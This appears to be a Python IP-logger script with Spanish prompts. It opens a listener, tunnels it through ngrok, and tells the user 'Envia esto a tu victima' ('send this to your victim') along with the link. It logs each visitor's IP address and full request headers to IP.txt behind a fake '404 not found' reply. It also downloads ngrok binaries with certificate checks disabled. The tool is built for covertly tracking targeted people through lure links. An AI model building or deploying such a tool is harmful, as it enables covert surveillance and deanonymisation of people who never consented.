import socket
import time
import subprocess
import os
import sys
import datetime
from colorama import Fore
def ip():
    
    seleccion = str(input("""
Selecciona el tipo de tunel:"""+ Fore.RED +""" 
-------------------""" + Fore.RESET + """ 
01)Ngrok
02)Local
03)Descargar Ngrok
04)Cerrar procesos""" + Fore.RED + """
-------------------""" + Fore.YELLOW + """
~~>: """))


    if seleccion == "01" or seleccion == "1":
        if os.path.exists("ngrok") == False:
            print("Descarga Ngrok porfavor")
            sys.exit()
        else:
            HOST, PORT = str(input(Fore.RESET + "Host: ")), int(input("Port: "))
            listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listen_socket.bind((HOST, PORT))
            listen_socket.listen(5)

        cantidad = 5
        while cantidad <= 5:
            time.sleep(1)
            os.system("clear")
            print("Espera un momento |")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento /")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento -")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento \ ")
            os.system("clear")
            print("Espera un momento :)")
            print("\n")
            cantidad = cantidad + 1

            os.system("./ngrok http {0}:{1} > /dev/null &".format(HOST, PORT))
            time.sleep(10)
            
            print("Envia esto a tu victima: ")
            os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")
            
    if seleccion == "02" or seleccion == "2":

        HOST, PORT = str(input(Fore.RESET + "Host: ")), int(input("Port: "))
        listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_socket.bind((HOST, PORT))
        listen_socket.listen(5)

        cantidad = 5
        while cantidad <= 5:
            time.sleep(1)
            os.system("clear")
            print("Espera un momento |")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento /")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento -")
            time.sleep(1)
            os.system("clear")
            print("Espera un momento \ ")
            os.system("clear")
            print("Espera un momento :)")
            print("\n")
            cantidad = cantidad + 1
        print("Envia esto a tu victima:{0}:{1}".format(HOST, PORT))
    if seleccion == "03" or seleccion == "3":
       
        seleccion1 = input(Fore.RESET + """
    Selecciona tu arquitectura: 

    1)AMD64(Linux 64 bits)[PC]
    2)AMD(Linux 32 bits)[PC]
    3)ARM64(Linux 64 bits)[Termux]
    4)ARM(Linux 32 bits)[Termux]
    ~~>: """)
        if seleccion1 == "1" or seleccion1 == "01":
            if os.path.exists("ngrok"):
                os.system("rm ngrok")
            print("\nEspera un minuto, esto puede tardar debido a tu conexion\n")
            os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
            os.system("unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
            os.system("rm -rf ngrok-stable-linux-amd64.zip")
            if os.path.exists("ngrok"):
                os.system("chmod +x ngrok")
                print("Se ha descargado con exito!\nvuelve a entrar")
                sys.exit()
        if seleccion1 == "2" or seleccion1 == "02":
            if os.path.exists("ngrok"):
                os.system("rm ngrok")
            print("\nEspera un minuto, esto puede tardar debido a tu conexion\n")
            os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1")
            os.system("unzip ngrok-stable-linux-386.zip > /dev/null 2>&1")
            os.system("rm -rf ngrok-stable-linux-386.zip")
            if os.path.exists("ngrok"):
                os.system("chmod +x ngrok")
                print("Se ha descargado con exito!\nvuelve a entrar")
                sys.exit()
        if seleccion1 == "3" or seleccion1 == "03":
            if os.path.exists("ngrok"):
                os.system("rm ngrok")
            print("\nEspera un minuto, esto puede tardar debido a tu conexion\n")
            os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz > /dev/null 2>&1")
            time.sleep(1)
            os.system("tar -xvf ngrok-stable-linux-arm64.tgz > /dev/null 2>&1")
            time.sleep(1)
            os.system("rm -rf ngrok-stable-linux-arm64.tgz")
            if os.path.exists("ngrok"):
                os.system("chmod +x ngrok")
                print("Se ha descargado con exito!\nvuelve a entrar")
                sys.exit()
        if seleccion1 == "4" or seleccion1 == "04":
            if os.path.exists("ngrok"):
                os.system("rm ngrok")
            print("\nEspera un minuto, esto puede tardar debido a tu conexion\n")
            os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1")
            time.sleep(1)
            os.system("unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1")
            time.sleep(1)
            os.system("rm -rf ngrok-stable-linux-arm.zip")
            if os.path.exists("ngrok"):
                os.system("chmod +x ngrok")
                print("Se ha descargado con exito!\nvuelve a entrar")
                sys.exit()

    if seleccion == "04" or seleccion == "4":
        os.system("\nps\n")
        seleccion2 = str(input(Fore.RESET + "\nPonga a qui el numero de proceso a cerrar: \n"))
        if seleccion2 == "":
            print("Ponga un caracter valido")
        else:
            os.system("kill {}".format(seleccion2))
            print("Si no aparece ningun error, aparentemente el proceso se cerro :)")
            os.sys.exit()
    while True:
        conexion, addr = listen_socket.accept() 
        print("\n[*]IP Logged!" + (str(addr)))
        request = conexion.recv(1024)
        print(request.decode('utf-8'))


        http_response = """
        404 not found

        """

        conexion.sendall(bytes(http_response,'utf-8'))
        conexion.close()


        a = open('IP.txt','a+')

        a.write(str(request.decode('utf-8')))

